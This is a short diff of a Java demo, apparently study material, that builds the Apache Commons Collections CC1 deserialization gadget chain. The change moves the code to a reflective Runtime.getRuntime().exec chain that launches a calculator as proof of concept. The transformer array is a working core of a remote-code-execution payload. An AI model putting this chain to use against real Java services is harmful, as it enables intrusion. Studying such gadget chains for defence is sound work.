@@ -9,16 +9,17 @@ import org.apache.commons.collections.map.TransformedMap;
 import java.util.HashMap;
 import java.util.Map;
 
-
 /**
  * @author sweet
  * @description
- * @date 2021/2/23 10:11
+ * @date 2021/2/23 18:34
  */
-public class CC1 {
+public class CC1Demo2 {
     public static void main(String[] args) {
         Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.getRuntime()),
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
         };
 
